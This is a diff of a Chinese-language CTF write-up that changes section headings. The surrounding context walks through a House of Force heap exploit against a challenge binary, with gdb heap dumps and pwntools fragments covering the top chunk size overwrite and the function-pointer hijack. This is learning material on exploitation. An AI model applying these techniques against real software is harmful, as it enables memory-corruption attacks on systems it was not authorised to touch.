@@ -170,8 +170,8 @@ r.sendline('5')
 r.recvuntil("Your choice:")
 print r.recvuntil("}")
 ```
-### **3. 利用过程**
-###### **1) 使用 add_item 往 box 中添加 item0**
+#### **3. 利用过程**
+##### **1) 添加 item0**
 添加item0后，堆内存分布如下，0x63000 处的 chunk0 为 box 结构体，结构体中包含 2 个函数指针。0x603020 处的 chunk1 为刚申请用于存放 name 的空间，并且 chunk1 与 top chunk 相邻。    
 ```C
 struct box{
@@ -200,7 +200,7 @@ gdb-peda$ x/20x 0x603000
 0x603090:       0x0000000000000000      0x0000000000000000
 ```
 
-#### **2. 溢出 name，覆盖 top chunk 的 size 为大数**
+##### **2. 溢出 name**
 由于 change_item() 函数中 name 的长度由用户指定，并且程序没有对长度做限制，当指定修改的 name 长度大于 name 的内存大小时，将会导致越界写内存，从而可修改 top chunk 的 size 字段为-1。
 ```python
 gdb-peda$ heapls
@@ -222,7 +222,7 @@ gdb-peda$ x/20x 0x603000
 0x603080:       0x0000000000000000      0x0000000000000000
 0x603090:       0x0000000000000000      0x0000000000000000
 ```
-#### **3. 使用 add_item 添加 item1，其中 name 的大小为一个很大的值**
+##### **3. 添加 item1**
 程序调用 malloc 在 top chunk 中分配一块大内存给 name ，此时更新 top chunk ptr 将会触发整数溢出，从而控制 top chunk 转移到指定内存。
 ```python
 gdb-peda$ heapls
@@ -242,7 +242,7 @@ gdb-peda$ x/20x 0x603000
 0x603080:       0x0000000000000000      0x0000000000000000
 0x603090:       0x0000000000000000      0x0000000000000000
 ```
-#### **4. 再次使用 add_item 添加 item2，此时返回目标内存**
+##### **4. 再次添加 item2**
 malloc(0x20) 从新的 top chunk 中分配一块内存给 item 的 name，rax 中返回的起始地址为 0x603010，该内存块会包含 box 结构体所在的 chunk。
 ```python
 gdb-peda$ heapls                                                                           
@@ -289,7 +289,7 @@ gdb-peda$ telescope 0x400d49
 0056| 0x400d81 (<magic+56>:     add    BYTE PTR [rax],al)
 ```
 
-#### **5. 退出程序**
+##### **5. 退出程序**
 退出程序时会调用 goodbye_message 函数，从而执行 magic 输出 flag。
 ```python
 [DEBUG] Sent 0x2 bytes:
